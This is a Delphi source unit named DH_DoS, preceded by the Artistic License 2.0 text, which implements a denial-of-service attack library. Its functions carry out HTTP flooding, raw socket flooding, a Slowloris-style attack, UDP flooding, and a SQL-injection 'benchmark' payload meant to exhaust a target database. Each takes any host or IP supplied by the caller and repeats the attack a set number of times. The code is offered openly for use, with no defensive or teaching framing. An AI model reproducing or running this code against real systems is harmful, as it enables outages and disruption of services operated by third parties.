{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// Unit : DH DoS
// Version : 0.4
// (C) Doddy Hackman 2016

unit DH_DoS;

interface

Uses
  SysUtils, WinInet, idHTTP, IdUDPClient, Windows, System.Win.ScktComp;

type
  T_DH_DoS = class
  private
  public
    constructor Create;
    destructor Destroy; override;
    function HTTP_Flood(web: string; count: integer): boolean;
    function Socket_Flood(ip: string; port: integer; flood: string;
      count: integer): boolean;
    function SQLI_DOS(web: string; count: integer): boolean;
    function Slowloris(web: string; count: integer): boolean;
    function UDP_DOS(ip: string; port: integer; count: integer): boolean;
  end;

implementation

constructor T_DH_DoS.Create;
begin
  inherited Create;
  //
end;

destructor T_DH_DoS.Destroy;
begin
  inherited Destroy;
end;

// Functions

function savefile(archivo, texto: string): bool;
var
  open_file: TextFile;
begin
  try
    begin
      AssignFile(open_file, archivo);
      FileMode := fmOpenWrite;

      if FileExists(archivo) then
      begin
        Append(open_file);
      end
      else
      begin
        Rewrite(open_file);
      end;

      Write(open_file, texto);
      CloseFile(open_file);
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function uri_split(link: string; opcion: string): string;
var
  uri_split: TURLComponents;
  scheme: array [0 .. INTERNET_MAX_SCHEME_LENGTH - 1] of char;
  Host: array [0 .. INTERNET_MAX_HOST_NAME_LENGTH - 1] of char;
  path: array [0 .. INTERNET_MAX_PATH_LENGTH - 1] of char;
  filename: string;
  query: array [0 .. 1024 - 1] of char;
begin
  if not(link = '') and not(opcion = '') then
  begin
    try
      begin
        ZeroMemory(@scheme, SizeOf(scheme));
        ZeroMemory(@Host, SizeOf(Host));
        ZeroMemory(@path, SizeOf(path));
        ZeroMemory(@query, SizeOf(query));
        ZeroMemory(@uri_split, SizeOf(TURLComponents));

        uri_split.dwStructSize := SizeOf(TURLComponents);
        uri_split.lpszScheme := scheme;
        uri_split.dwSchemeLength := SizeOf(scheme);
        uri_split.lpszHostName := Host;
        uri_split.dwHostNameLength := SizeOf(Host);
        uri_split.lpszUrlPath := path;
        uri_split.dwUrlPathLength := SizeOf(path);
        uri_split.lpszExtraInfo := query;
        uri_split.dwExtraInfoLength := SizeOf(query);

        InternetCrackUrl(Pchar(link), Length(link), ICU_DECODE or ICU_ESCAPE,
          uri_split);

        if (opcion = 'scheme') then
        begin
          if not(scheme = '') then
          begin
            Result := scheme;
          end
          else
          begin
            Result := 'Error';
          end;
        end
        else if (opcion = 'host') then
        begin
          if not(Host = '') then
          begin
            Result := Host;
          end
          else
          begin
            Result := 'Error';
          end;
        end
        else if (opcion = 'path') then
        begin
          if not(path = '') then
          begin
            Result := path;
          end
          else
          begin
            Result := 'Error';
          end;
        end
        else if (opcion = 'filename') then
        begin
          filename := path;
          filename := StringReplace(filename, '/', '\', [rfReplaceAll]);
          filename := ExtractFileName(filename);
          if not(filename = '') then
          begin
            Result := filename;
          end
          else
          begin
            Result := 'Error';
          end;
        end
        else if (opcion = 'query') then
        begin
          if not(query = '') then
          begin
            Result := query;
          end
          else
          begin
            Result := 'Error';
          end;
        end
        else
        begin
          Result := 'Error';
        end;
      end;
    except
      begin
        Result := 'Error';
      end;
    end;
  end
  else
  begin
    Result := 'Error';
  end;
end;

//

// Functions DDOS

function T_DH_DoS.HTTP_Flood(web: string; count: integer): boolean;
var
  client_socket: TClientSocket;
  Host: string;
  command: String;
  i: integer;
  counter_attacks: integer;
  response: boolean;
begin
  response := False;
  if not(web = '') and not(count < 0) then
  begin
    counter_attacks := 0;
    for i := 1 to count do
    begin
      try
        begin
          client_socket := TClientSocket.Create(nil);
          Host := uri_split(web, 'host');
          client_socket.ClientType := ctBlocking;
          client_socket.Host := Host;
          client_socket.port := 80;
          client_socket.Open;
          if client_socket.Active then
          begin
            command := 'GET / HTTP/1.1' + #13#10 + 'Host:' + Host + #13#10 +
              'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0'
              + #13#10 + 'Connection: Keep-Alive' + #13#10 + #13#10;
            client_socket.socket.SendText(command);
            Sleep(3000);
            // savefile('httpflood_' + IntToStr(i) + '.txt',
            // client_socket.socket.ReceiveText);
            Inc(counter_attacks);
          end;
          client_socket.Free();
        end;
      except
        begin
          //
        end;
      end;

      if (counter_attacks >= 1) then
      begin
        response := True;
      end
      else
      begin
        response := False;
      end;

    end;
  end
  else
  begin
    response := False;
  end;
  Result := response;
end;

function T_DH_DoS.Socket_Flood(ip: string; port: integer; flood: string;
  count: integer): boolean;
var
  client_socket: TClientSocket;
  command: String;
  counter_attacks: integer;
  response: boolean;
  i: integer;
begin
  response := False;
  if not(ip = '') and not(port < 0) and not(flood = '') and not(count < 0) then
  begin
    counter_attacks := 0;
    for i := 1 to count do
    begin

      try
        begin
          client_socket := TClientSocket.Create(nil);
          client_socket.ClientType := ctBlocking;
          client_socket.Address := ip;
          client_socket.port := port;
          client_socket.Open;
          if client_socket.Active then
          begin
            client_socket.socket.SendText(flood);
            Sleep(3000);
            // savefile('socketflood_' + IntToStr(i) + '.txt',
            // client_socket.socket.ReceiveText);
            Inc(counter_attacks);
          end;
          client_socket.Free();
        end;
      except
        begin
          //
        end;
      end;

    end;

    if (counter_attacks >= 1) then
    begin
      response := True;
    end
    else
    begin
      response := False;
    end;
  end
  else
  begin
    response := False;
  end;

  Result := response;
end;

function T_DH_DoS.Slowloris(web: string; count: integer): boolean;
var
  client_socket: TClientSocket;
  Host: string;
  command: string;
  counter_attacks: integer;
  response: boolean;
  i: integer;
begin
  response := False;
  if not(web = '') and not(count < 0) then
  begin
    counter_attacks := 0;
    for i := 1 to count do
    begin

      try
        begin
          client_socket := TClientSocket.Create(nil);
          Host := uri_split(web, 'host');
          client_socket.ClientType := ctBlocking;
          client_socket.Host := Host;
          client_socket.port := 80;
          client_socket.Open;
          if client_socket.Active then
          begin
            command := 'POST / HTTP/1.1' + #13#10 + 'Host:' + Host + #13#10 +
              'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0'
              + #13#10 + 'Content-Length: 42' + #13#10 + #13#10;
            client_socket.socket.SendText(command);
            Sleep(3000);
            // savefile('slowloris_' + IntToStr(i) + '.txt',
            // client_socket.socket.ReceiveText);
            Inc(counter_attacks);
          end;
          client_socket.Free();
        end;
      except
        begin
          //
        end;
      end;

    end;

    if (counter_attacks >= 1) then
    begin
      response := True;
    end
    else
    begin
      response := False;
    end;

  end
  else
  begin
    response := False;
  end;

  Result := response;
end;

function T_DH_DoS.SQLI_DOS(web: string; count: integer): boolean;
var
  nave: TIdHTTP;
  sqli: string;
  code: string;
  counter_attacks: integer;
  response: boolean;
  i: integer;
begin
  response := False;
  if not(web = '') and not(count < 0) then
  begin
    counter_attacks := 0;
    for i := 1 to count do
    begin
      try
        begin
          nave := TIdHTTP.Create();
          nave.Request.UserAgent :=
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0';
          sqli := ' and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))';
          code := nave.Get(web + sqli);
          nave.Free();
          // savefile('sqlidos_' + IntToStr(i) + '.txt', code);
          Inc(counter_attacks);
        end;
      except
        begin
          //
        end;
      end;
    end;

    if (counter_attacks >= 1) then
    begin
      response := True;
    end
    else
    begin
      response := False;
    end;

  end
  else
  begin
    response := False;
  end;
  Result := response;
end;

function T_DH_DoS.UDP_DOS(ip: string; port: integer; count: integer): boolean;
var
  udp_client: TIdUDPClient;
  counter_attacks: integer;
  response: boolean;
  i: integer;
begin
  response := False;
  if not(ip = '') and not(port < 0) and not(count < 0) then
  begin
    counter_attacks := 0;
    for i := 1 to count do
    begin
      try
        begin
          udp_client := TIdUDPClient.Create();
          udp_client.Host := ip;
          udp_client.port := port;
          udp_client.Active := True;
          udp_client.SendBuffer(TEncoding.UTF8.GetBytes('$$$$$$$$$$$$$$$'));
          udp_client.Active := False;
          udp_client.Free();
          Inc(counter_attacks);
        end;
      except
        begin
          //
        end;
      end;
    end;

    if (counter_attacks >= 1) then
    begin
      response := True;
    end
    else
    begin
      response := False;
    end;
  end
  else
  begin
    response := False;
  end;
  Result := response;
end;

end.

// The End ?
